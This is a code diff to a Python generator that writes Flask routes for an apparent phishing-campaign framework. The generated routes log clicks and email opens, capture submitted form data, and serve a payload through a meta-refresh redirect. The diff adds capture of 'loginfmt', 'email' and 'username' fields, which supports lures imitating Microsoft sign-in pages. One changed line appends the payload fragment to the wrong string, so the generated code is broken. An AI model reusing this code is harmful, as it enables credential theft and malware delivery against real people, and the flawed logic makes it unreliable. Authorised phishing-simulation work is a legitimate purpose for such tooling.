@@ -67,14 +67,14 @@ def write_to_disk(campaign):
     routes_content += f'\n\nbase_url = \'{base_url}\''
 
     # add redirect url into to routes if used
-    if campaign['redirect_url']:
+    if campaign['redirect_url'] != 'null':
         routes_content += f'\nredirect_url = \'{campaign["redirect_url"]}\''
 
     # check if payload is being used
     uses_payload = False
     if campaign['payload_url'] and campaign['payload_url'][:1] == '/' and 'payload_file' in campaign:
         uses_payload = True
-    
+
     # add payload variables (route is written later)
     if uses_payload:
         routes_content += f'\npayload_url = \'{campaign["payload_url"]}\''
@@ -93,20 +93,28 @@ def write_to_disk(campaign):
         routes_content += f'\n\n\n@app.route(url_{idx + 1}, methods=[\'GET\', \'POST\'])'
         routes_content += f'\ndef url_{idx + 1}():'
         routes_content += '\n    id = request.args.get(\'id\')'
-        
+
         # if first route, report clicks
         if idx == 0:
             routes_content += '\n    if id is not None:'
             routes_content += '\n        report_action(id, \'Clicked\', request.remote_addr)'
-        # else report form submissions
+        # else report form submissions and grab username/email/loginfmt
         else:
             routes_content += '\n    if request.form:'
             routes_content += '\n        report_form(id, request.form, request.remote_addr)'
-        
+            routes_content += '\n    loginfmt = request.form.get(\'loginfmt\')'
+            routes_content += '\n    email = request.form.get(\'email\')'
+            routes_content += '\n    username = request.form.get(\'username\')'
+
+        # render template str
+        render_temp = f'\n\n    return render_template(\'{idx + 1}.html\', next_url = base_url + url_for(\'url_{idx + 2}\', id=id)'
+        if idx != 0:
+            render_temp += ', loginfmt=loginfmt, email=email, username=username'
         if uses_payload:
-            routes_content += f'\n\n    return render_template(\'{idx + 1}.html\', next_url = base_url + url_for(\'url_{idx + 2}\', id=id), serve_payload = Markup(\'<meta http-equiv="refresh" content="0; url=\' + base_url + url_for("payload", id=id) + \'">\'))'
-        else:
-            routes_content += f'\n\n    return render_template(\'{idx + 1}.html\', next_url = base_url + url_for(\'url_{idx + 2}\', id=id))'
+            routes_content += f', serve_payload = Markup(\'<meta http-equiv="refresh" content="0; url=\' + base_url + url_for("payload", id=id) + \'">\')'
+        render_temp += ')'
+
+        routes_content += render_temp
 
         # write html template file
         template_name = f'{idx + 1}.html'
@@ -119,10 +127,10 @@ def write_to_disk(campaign):
     routes_content += '\n    id = request.args.get(\'id\')'
     routes_content += '\n    if request.form:'
     routes_content += '\n        report_form(id, request.form, request.remote_addr)'
-    if campaign['redirect_url']:
+    if campaign['redirect_url'] != 'null':
         routes_content += f'\n\n    return redirect(redirect_url)'
     else:
-        routes_content += '\n\n    return redirect(url_for(url_1, id=id))'
+        routes_content += '\n\n    return redirect(url_for(\'url_1\', id=id))'
 
     # write route for tracking email opens
     routes_content += f'\n\n\n@app.route(\'/<tracker>/pixel.png\')'
